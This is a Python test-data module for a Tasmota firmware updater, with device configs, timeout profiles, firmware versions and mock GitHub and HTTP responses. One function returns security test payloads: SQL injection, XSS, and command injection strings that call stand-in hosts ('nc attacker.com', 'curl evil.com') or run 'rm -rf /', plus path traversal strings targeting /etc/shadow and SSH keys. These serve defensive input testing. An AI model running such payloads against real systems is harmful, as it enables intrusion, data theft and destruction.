"""Test data fixtures and generators for Tasmota Updater tests

This module provides comprehensive test data including:
- Device configurations for various scenarios
- Mock firmware versions and release data
- Network response samples
- Timeout configuration templates
- Error scenario datasets
- Performance testing data generators
"""

import random
import string
import json
from typing import Dict, List, Any, Generator
from dataclasses import dataclass
from datetime import datetime, timedelta


@dataclass
class DeviceTestProfile:
    """Test profile for different device types and scenarios"""
    name: str
    ip_range: str
    timeout_range: tuple
    success_rate: float
    firmware_version: str
    characteristics: Dict[str, Any]


class TestDataGenerator:
    """Generator for test data with various scenarios"""

    @staticmethod
    def generate_device_configs(count: int = 10, include_fake: bool = True) -> List[Dict[str, Any]]:
        """Generate device configurations for testing"""
        devices = []

        for i in range(count):
            base_ip = f"192.168.1.{100 + i}"

            if include_fake and i % 3 == 0:  # Every 3rd device is fake
                device = {
                    'ip': base_ip,
                    'fake': True,
                    'dns_name': f'fake-tasmota-{i}',
                    'firmware_info': {
                        'version': f'12.{i % 5}.{i % 3}',
                        'core_version': '2.7.4.9',
                        'sdk_version': '3.0.2',
                        'is_minimal': i % 4 == 0
                    },
                    'timeout': 180 + (i * 30)
                }
            else:
                device = {
                    'ip': base_ip,
                    'username': 'admin',
                    'password': f'password{i}',
                    'timeout': 120 + (i * 60),
                    'dns_name': f'tasmota-device-{i}.local'
                }

            devices.append(device)

        return devices

    @staticmethod
    def generate_timeout_configurations() -> Dict[str, Dict[str, Any]]:
        """Generate various timeout configurations for testing"""
        return {
            'minimal': {
                'total_timeout': 60,
                'initial_wait': 5,
                'min_check_interval': 1.0,
                'max_check_interval': 10.0,
                'backoff_multiplier': 1.5,
                'request_timeout': 5
            },
            'standard': {
                'total_timeout': 180,
                'initial_wait': 10,
                'min_check_interval': 1.0,
                'max_check_interval': 30.0,
                'backoff_multiplier': 1.5,
                'request_timeout': 5
            },
            'extended': {
                'total_timeout': 600,
                'initial_wait': 15,
                'min_check_interval': 2.0,
                'max_check_interval': 30.0,
                'backoff_multiplier': 1.5,
                'request_timeout': 10
            },
            'aggressive': {
                'total_timeout': 300,
                'initial_wait': 5,
                'min_check_interval': 0.5,
                'max_check_interval': 15.0,
                'backoff_multiplier': 2.0,
                'request_timeout': 3
            },
            'conservative': {
                'total_timeout': 450,
                'initial_wait': 20,
                'min_check_interval': 3.0,
                'max_check_interval': 45.0,
                'backoff_multiplier': 1.2,
                'request_timeout': 15
            }
        }

    @staticmethod
    def generate_firmware_versions() -> Dict[str, Dict[str, Any]]:
        """Generate firmware version data for testing"""
        versions = {}

        # Current versions (don't need updates)
        current_versions = ['13.2.0', '13.1.5', '13.1.0']
        for version in current_versions:
            versions[f'current_{version}'] = {
                'version': version,
                'core_version': '2.7.4.9',
                'sdk_version': '3.0.2',
                'is_minimal': False
            }

        # Outdated versions (need updates)
        outdated_versions = ['12.5.0', '12.4.3', '12.3.1', '12.2.0', '12.1.0', '12.0.0']
        for version in outdated_versions:
            versions[f'outdated_{version}'] = {
                'version': version,
                'core_version': '2.7.4.8' if version.startswith('12.') else '2.7.4.9',
                'sdk_version': '3.0.1' if version.startswith('12.') else '3.0.2',
                'is_minimal': version.endswith('.0')
            }

        # Minimal versions
        minimal_versions = ['13.2.0-minimal', '12.5.0-minimal']
        for version in minimal_versions:
            base_version = version.replace('-minimal', '')
            versions[f'minimal_{base_version}'] = {
                'version': version,
                'core_version': '2.7.4.9',
                'sdk_version': '3.0.2',
                'is_minimal': True
            }

        # Beta/development versions
        beta_versions = ['13.3.0-beta', '13.2.1-dev']
        for version in beta_versions:
            versions[f'beta_{version}'] = {
                'version': version,
                'core_version': '2.7.4.9',
                'sdk_version': '3.0.2',
                'is_minimal': False
            }

        return versions

    @staticmethod
    def generate_release_data() -> Dict[str, Dict[str, Any]]:
        """Generate release data for testing"""
        releases = {
            'latest': {
                'version': '13.2.0',
                'release_date': '2024-01-15',
                'release_notes': 'Bug fixes and improvements. Enhanced timeout handling for firmware updates.',
                'download_url': 'https://github.com/arendst/Tasmota/releases/download/v13.2.0/tasmota.bin',
                'release_url': 'https://github.com/arendst/Tasmota/releases/'
            },
            'previous': {
                'version': '13.1.5',
                'release_date': '2024-01-01',
                'release_notes': 'Security updates and bug fixes.',
                'download_url': 'https://github.com/arendst/Tasmota/releases/download/v13.1.5/tasmota.bin',
                'release_url': 'https://github.com/arendst/Tasmota/releases/'
            },
            'beta': {
                'version': '13.3.0-beta',
                'release_date': '2024-02-01',
                'release_notes': 'Beta release with experimental features.',
                'download_url': 'https://github.com/arendst/Tasmota/releases/download/v13.3.0-beta/tasmota.bin',
                'release_url': 'https://github.com/arendst/Tasmota/releases/'
            }
        }

        return releases

    @staticmethod
    def generate_error_scenarios() -> Dict[str, Dict[str, Any]]:
        """Generate error scenarios for comprehensive testing"""
        scenarios = {
            'network_timeout': {
                'description': 'Network timeout during device communication',
                'error_type': 'Timeout',
                'should_retry': True,
                'expected_attempts': 5,
                'recovery_time': 30
            },
            'connection_refused': {
                'description': 'Device refuses connection',
                'error_type': 'ConnectionError',
                'should_retry': True,
                'expected_attempts': 10,
                'recovery_time': 60
            },
            'device_offline': {
                'description': 'Device is completely offline',
                'error_type': 'ConnectionError',
                'should_retry': True,
                'expected_attempts': 15,
                'recovery_time': 120
            },
            'firmware_corrupted': {
                'description': 'Firmware update corrupted during flash',
                'error_type': 'UpdateError',
                'should_retry': False,
                'expected_attempts': 1,
                'recovery_time': None
            },
            'invalid_firmware': {
                'description': 'Invalid firmware for device type',
                'error_type': 'ValidationError',
                'should_retry': False,
                'expected_attempts': 1,
                'recovery_time': None
            },
            'device_busy': {
                'description': 'Device busy with another operation',
                'error_type': 'DeviceBusyError',
                'should_retry': True,
                'expected_attempts': 3,
                'recovery_time': 15
            },
            'authentication_failed': {
                'description': 'Authentication credentials rejected',
                'error_type': 'AuthenticationError',
                'should_retry': False,
                'expected_attempts': 1,
                'recovery_time': None
            },
            'insufficient_memory': {
                'description': 'Device has insufficient memory for update',
                'error_type': 'MemoryError',
                'should_retry': False,
                'expected_attempts': 1,
                'recovery_time': None
            }
        }

        return scenarios

    @staticmethod
    def generate_performance_test_data(num_devices: int = 100) -> Dict[str, Any]:
        """Generate data for performance testing"""
        return {
            'devices': [
                {
                    'ip': f'192.168.{i//254}.{i%254}',
                    'timeout': 60 + (i % 540),  # Vary timeouts
                    'fake': i % 10 == 0,  # 10% fake devices
                    'expected_duration': random.uniform(30, 180),  # Simulated update time
                    'success_probability': 0.9 if i % 10 != 9 else 0.1  # 90% success rate
                }
                for i in range(1, num_devices + 1)
            ],
            'load_patterns': {
                'gradual_ramp': [i for i in range(1, num_devices + 1, 5)],  # Gradual increase
                'burst': [num_devices] * 10,  # Sudden burst
                'wave': [abs(50 - (i % 100)) for i in range(200)],  # Wave pattern
                'random': [random.randint(1, num_devices) for _ in range(100)]  # Random load
            },
            'stress_scenarios': {
                'high_concurrency': {'max_workers': 50, 'timeout': 30},
                'long_duration': {'max_workers': 10, 'timeout': 600},
                'mixed_timeouts': {'max_workers': 20, 'timeout_variance': 500},
                'memory_intensive': {'max_workers': 30, 'data_size': 1024*1024}
            }
        }

    @staticmethod
    def generate_security_test_data() -> Dict[str, List[str]]:
        """Generate security test data including malicious inputs"""
        return {
            'sql_injection': [
                "'; DROP TABLE devices; --",
                "' OR '1'='1",
                "'; DELETE FROM users; --",
                "' UNION SELECT * FROM secrets; --",
                "'; INSERT INTO log VALUES ('hacked'); --"
            ],
            'xss_payloads': [
                "<script>alert('xss')</script>",
                "<img src=x onerror=alert('xss')>",
                "javascript:alert('xss')",
                "<svg onload=alert('xss')>",
                "';alert('xss');//"
            ],
            'command_injection': [
                "; cat /etc/passwd",
                "&& rm -rf /",
                "| nc attacker.com 80",
                "`whoami`",
                "$(curl evil.com)"
            ],
            'path_traversal': [
                "../../etc/passwd",
                "../../../root/.ssh/id_rsa",
                "..\\windows\\system32\\drivers\\etc\\hosts",
                "/etc/shadow",
                "/proc/self/environ"
            ],
            'format_string': [
                "%x%x%x%x",
                "%s%s%s%s",
                "%n%n%n%n",
                "%08x.%08x.%08x.%08x",
                "%p%p%p%p"
            ],
            'buffer_overflow': [
                "A" * 1000,
                "A" * 10000,
                "A" * 100000,
                "\x00" * 1000,
                "\xFF" * 1000
            ],
            'unicode_attacks': [
                "\u202e\u0061\u202d",  # Right-to-left override
                "\u0000",             # Null byte
                "\uFEFF",             # Byte order mark
                "\u2028",             # Line separator
                "\u2029"              # Paragraph separator
            ]
        }

    @staticmethod
    def generate_network_simulation_data() -> Dict[str, Dict[str, Any]]:
        """Generate network simulation data for testing"""
        return {
            'latency_profiles': {
                'lan': {'min': 0.001, 'max': 0.005, 'avg': 0.002},
                'wifi': {'min': 0.005, 'max': 0.050, 'avg': 0.020},
                'slow': {'min': 0.100, 'max': 0.500, 'avg': 0.250},
                'unstable': {'min': 0.001, 'max': 2.000, 'avg': 0.100}
            },
            'packet_loss_profiles': {
                'perfect': 0.0,
                'good': 0.01,
                'fair': 0.05,
                'poor': 0.15,
                'terrible': 0.50
            },
            'bandwidth_profiles': {
                'gigabit': {'upload': 1000, 'download': 1000},
                'fast': {'upload': 100, 'download': 100},
                'normal': {'upload': 25, 'download': 100},
                'slow': {'upload': 1, 'download': 10},
                'dialup': {'upload': 0.056, 'download': 0.056}
            },
            'failure_patterns': {
                'intermittent': {
                    'description': 'Random intermittent failures',
                    'failure_rate': 0.1,
                    'recovery_time': 5
                },
                'burst_errors': {
                    'description': 'Clustered error bursts',
                    'burst_size': 5,
                    'burst_frequency': 0.05
                },
                'degradation': {
                    'description': 'Gradual network degradation',
                    'initial_quality': 1.0,
                    'degradation_rate': 0.01
                }
            }
        }


class TestDataValidators:
    """Validators for test data integrity"""

    @staticmethod
    def validate_device_config(device: Dict[str, Any]) -> bool:
        """Validate device configuration structure"""
        required_fields = ['ip']
        optional_fields = ['username', 'password', 'timeout', 'fake', 'dns_name', 'firmware_info']

        # Check required fields
        if not all(field in device for field in required_fields):
            return False

        # Validate IP format
        ip = device['ip']
        if not isinstance(ip, str) or not TestDataValidators._is_valid_ip_format(ip):
            return False

        # Validate timeout if present
        if 'timeout' in device:
            timeout = device['timeout']
            if not isinstance(timeout, (int, float)) or timeout <= 0:
                return False

        # Validate fake device structure
        if device.get('fake', False):
            if 'firmware_info' not in device:
                return False

        return True

    @staticmethod
    def validate_timeout_config(config: Dict[str, Any]) -> bool:
        """Validate timeout configuration structure"""
        required_fields = [
            'total_timeout', 'initial_wait', 'min_check_interval',
            'max_check_interval', 'backoff_multiplier', 'request_timeout'
        ]

        if not all(field in config for field in required_fields):
            return False

        # Validate numeric constraints
        if config['total_timeout'] < 30 or config['total_timeout'] > 600:
            return False

        if config['min_check_interval'] >= config['max_check_interval']:
            return False

        if config['initial_wait'] >= config['total_timeout']:
            return False

        return True

    @staticmethod
    def _is_valid_ip_format(ip: str) -> bool:
        """Basic IP format validation"""
        try:
            parts = ip.split('.')
            if len(parts) != 4:
                return False

            for part in parts:
                if not part.isdigit() or not 0 <= int(part) <= 255:
                    return False

            return True
        except:
            return False


class MockDataProvider:
    """Provider for mock data during testing"""

    @staticmethod
    def get_mock_http_responses() -> Dict[str, Any]:
        """Get mock HTTP responses for various scenarios"""
        return {
            'device_status_ok': {
                'status_code': 200,
                'json': {
                    'StatusFWR': {
                        'Version': '12.5.0',
                        'Core': '2.7.4.9',
                        'SDK': '3.0.2'
                    }
                }
            },
            'device_status_minimal': {
                'status_code': 200,
                'json': {
                    'StatusFWR': {
                        'Version': '12.5.0-minimal',
                        'Core': '2.7.4.9',
                        'SDK': '3.0.2'
                    }
                }
            },
            'upgrade_command_ok': {
                'status_code': 200,
                'json': {
                    'Status': 'Upgrade started'
                }
            },
            'device_restarting': {
                'status_code': 503,
                'text': 'Device restarting'
            },
            'device_offline': {
                'side_effect': ConnectionError("Device offline")
            },
            'request_timeout': {
                'side_effect': TimeoutError("Request timeout")
            }
        }

    @staticmethod
    def get_github_api_responses() -> Dict[str, Any]:
        """Get mock GitHub API responses"""
        return {
            'latest_release': {
                'status_code': 200,
                'json': {
                    'tag_name': 'v13.2.0',
                    'published_at': '2024-01-15T10:00:00Z',
                    'body': 'Bug fixes and improvements',
                    'assets': [
                        {
                            'name': 'tasmota.bin',
                            'browser_download_url': 'https://github.com/arendst/Tasmota/releases/download/v13.2.0/tasmota.bin'
                        }
                    ]
                }
            },
            'rate_limited': {
                'status_code': 403,
                'json': {
                    'message': 'API rate limit exceeded',
                    'documentation_url': 'https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting'
                }
            },
            'not_found': {
                'status_code': 404,
                'json': {
                    'message': 'Not Found',
                    'documentation_url': 'https://docs.github.com/rest'
                }
            }
        }


# Convenience functions for quick test data access
def get_test_devices(count: int = 5) -> List[Dict[str, Any]]:
    """Quick access to test device configurations"""
    return TestDataGenerator.generate_device_configs(count)


def get_test_timeouts() -> Dict[str, Dict[str, Any]]:
    """Quick access to timeout configurations"""
    return TestDataGenerator.generate_timeout_configurations()


def get_test_versions() -> Dict[str, Dict[str, Any]]:
    """Quick access to firmware versions"""
    return TestDataGenerator.generate_firmware_versions()


def get_test_errors() -> Dict[str, Dict[str, Any]]:
    """Quick access to error scenarios"""
    return TestDataGenerator.generate_error_scenarios()


def get_security_payloads() -> Dict[str, List[str]]:
    """Quick access to security test payloads"""
    return TestDataGenerator.generate_security_test_data()


# Export commonly used test data
__all__ = [
    'TestDataGenerator',
    'TestDataValidators',
    'MockDataProvider',
    'DeviceTestProfile',
    'get_test_devices',
    'get_test_timeouts',
    'get_test_versions',
    'get_test_errors',
    'get_security_payloads'
]